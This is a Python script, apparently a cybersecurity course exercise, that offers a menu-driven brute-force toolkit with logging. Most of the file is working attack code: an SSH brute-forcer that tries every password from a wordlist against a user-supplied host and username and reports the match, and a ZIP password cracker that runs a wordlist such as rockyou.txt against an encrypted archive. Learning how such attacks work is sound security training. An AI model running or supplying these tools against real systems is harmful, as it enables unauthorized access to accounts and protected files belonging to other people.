#!/usr/bin/env python3

# Script Name                           401ops18.py
# Author                                Bill Kachersky
# Date of last revision                 11/08/2021
# Description of purpose                Logger Tool Part 1



# Resources and Thanks:
# https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
# https://pexpect.readthedocs.io/en/stable/api/pxssh.html
# https://github.com/codefellows/seattle-cyber-401d3/blob/main/class-16/challenges/DEMO.md
# https://www.geeksforgeeks.org/python-how-to-search-for-a-string-in-text-files/
# https://github.com/codefellows/seattle-cyber-401d3/blob/main/class-18/challenges/DEMO.md
# https://www.geeksforgeeks.org/how-to-brute-force-zip-file-passwords-in-python/



# Import libraries
import time
import paramiko, sys, os, socket
import getpass
import zipfile
from zipfile import ZipFile
import logging

# log=logging.getLogger("testlog")
logging.basicConfig(filename='test.log', encoding='utf-8', level=logging.DEBUG, format='%(asctime)s %(message)s')


# Declare functions
def iterator():
    filepath = input("Enter your dictionary filepath:\n")
    #filepath = '/home/billkach/rockyou.txt' #test filepath
    
    file = open(filepath, 'r', encoding = "ISO-8859-1")
    line = file.readline()
    while line:
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)
        line = file.readline()
    file.close()

def check_password():
    user_pass = input("Input the most common password you can think of, and see if we can find it:\n")
    filepath = input("Enter your dictionary filepath:\n")

    file1 = open(filepath, "r")

    flag = 0
    index = 0

    for line in file1:
        index += 1

        if user_pass in line:

            flag = 1
            break

    if flag == 0:
        print('Password', user_pass, 'not found')
    else:
        print('Password', user_pass, 'found on line', index)


def ssh():
    global host, user, line, input_file
    line ="\n-------------------------------------------------------\n"

    try:
        host = input(r"Enter Host IP: ")
        user = input(r"Enter SSH Username: ")
        input_file = input(r"Enter SSH Password File: ")

        if os.path.exists(input_file) == False:
            print("\nFile Path Does Not Exist.")
            sys.exit(4)
        

    except KeyboardInterrupt:
        print("\n\nUser Requested An Interrupt")
        sys.exit(3)

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=user, password=password)
    except paramiko.AuthenticationException:
        # Authentication Failed
        code = 1
    except socket.error as e:
        # Connection Failed ...Host Down"
        code = 2

    ssh.close()
    return code

def ssh_pass():
    logging.debug("Doing something!")    
    iteratefile = open(input_file, 'r', encoding = "ISO-8859-1")

    print("")

    for i in iteratefile.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(password)

            if response == 0:
                print("%s[*] User: %s [*] Pass Found: %s%s" % (line, user, password, line))
                logging.info('Password was confirmed: ', password)
                sys.exit(0)
            elif response == 1:
                print("[*] User: %s [*] Pass: %s => Login Incorrect! <=" % (user, password))
                logging.error('Incorrect Login')
            elif response == 2:
                print("[*] Connection Could Not Be Established to Address: %s" % (host))
                logging.error('Connection Could Not Be Established')
                sys.exit(2)
        except Exception as e:
            print(e)
            pass

    iteratefile.close()



# Mode 4 - Crack an Encrypted File

def crack_password(password_list, obj):
    # tracking line no. at which password is found
    idx = 0
  
    # open file in read byte mode only as "rockyou.txt"
    # file contains some special characters and hence
    # UnicodeDecodeError will be generated
    with open(password_list, 'rb') as file:
        for line in file:
            for word in line.split():
                try:
                    idx += 1
                    obj.extractall(pwd=word)
                    print("Password found at line", idx)
                    print("Password is", word.decode())
                    return True
                except:
                    continue
    return False
  
def zipcrack():  
    password_list = input("Specify the filepath of the password list you'd like to utilize: ")
    
    zip_file = input("Specify the file you'd like to find the password for: ")
    
    # ZipFile object initialised
    obj = zipfile.ZipFile(zip_file)
    
    # count of number of words present in file
    cnt = len(list(open(password_list, "rb")))
    
    print("There are total", cnt,
        "number of passwords to test")
    
    if crack_password(password_list, obj) == False:
        print("Password not found in this file")

# Main



if __name__ == "__main__": # when my computer runs this file...do this stuff
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - SSH Brute Force Attack
4 - Encrypted File Password Cracker
5 - Exit
    Please enter a number: 
""")
        if (mode == "1"):
            iterator()
        elif (mode == "2"):
            check_password()
        elif (mode == '3'):
            ssh()
            ssh_pass()
        elif (mode == '4'):
            zipcrack()
        elif (mode == '5'):
            break
        else:
            print("Invalid selection...") 


# End
